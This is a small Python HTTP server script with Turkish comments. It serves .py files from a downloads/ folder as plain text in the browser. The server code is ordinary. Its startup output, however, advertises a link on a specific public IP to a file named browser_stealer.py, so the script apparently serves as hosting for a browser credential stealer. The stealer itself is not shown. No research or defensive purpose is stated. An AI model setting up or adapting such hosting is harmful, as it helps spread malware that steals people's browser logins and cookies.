#!/usr/bin/env python3
"""
Minimal HTTP server: .py dosyalarini tarayicida kaynak kodu olarak gosterir
(Content-Type: text/plain). Ekran goruntusundeki gibi davranir.
"""
import http.server
import socketserver
import os

PORT = 8080  # 80 dolu/izin hatasi verirse 8080 kullan. URL: http://IP:8080/downloads/...
# Sunucu kokunu bu klasore gore ayarla (downloads/ bu klasorun altinda olacak)
WEB_ROOT = os.path.dirname(os.path.abspath(__file__))


class PlainPythonHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=WEB_ROOT, **kwargs)

    def guess_type(self, path):
        """ .py dosyalari icin text/plain kullan - tarayici kodu gosterir """
        if path.endswith('.py'):
            return 'text/plain; charset=utf-8'
        return super().guess_type(path)

    def end_headers(self):
        # .py icin inline gosterim (indirme yerine sayfada goster)
        if self.path.endswith('.py'):
            self.send_header('Content-Disposition', 'inline')
        super().end_headers()


if __name__ == '__main__':
    os.chdir(WEB_ROOT)
    downloads = os.path.join(WEB_ROOT, 'downloads')
    os.makedirs(downloads, exist_ok=True)
    with socketserver.TCPServer(('0.0.0.0', PORT), PlainPythonHandler) as httpd:
        print(f'Sunucu dinleniyor: 0.0.0.0:{PORT}')
        print(f'downloads/ -> {downloads}')
        print(f'Tarayicida ac: http://95.217.249.153:{PORT}/downloads/browser_stealer.py')
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print('\nCikis.')
